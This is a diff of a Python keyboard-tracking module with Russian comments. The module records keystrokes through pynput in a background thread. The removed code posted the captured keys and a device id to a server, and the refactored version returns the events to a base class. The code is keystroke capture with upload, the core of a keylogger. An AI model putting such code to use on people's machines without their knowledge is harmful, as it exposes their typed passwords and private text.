@@ -2,30 +2,19 @@ from threading import Thread
 from pynput.keyboard import Listener
 from time import time
 from . import BaseModule
-from requests import post
-from logging import info
-from ..extras.id import generate_id
 
 
 class KeyboardModule(BaseModule):
-    key_events = list()
-
     def __init__(self):
-        super().__init__(name='keyboard')
+        super().__init__(name='keyboard', source=101)
 
         # Создаем поток для трекинга нажатий на клавиатуру
         # передаем в функцию массив нажатых клавиш
-        keys_thread = Thread(target=key_tracking, args=(self.key_events,))
+        keys_thread = Thread(target=key_tracking, args=(self.events, ))
         keys_thread.start()
 
     def update(self):
-        # Метод отправки данных на сервер
-        try:
-            post(self.url, json=dict(id_device=generate_id(), source=101, value=self.key_events))
-            info(f'Отправлены данные: {self.key_events}')
-            self.key_events.clear()  # Отчищаем массив нажатых клавиш
-        except Exception as exception:
-            info(f'Возникла проблема при подключению: {exception}')
+        return self.events
 
 
 def key_tracking(key_events):
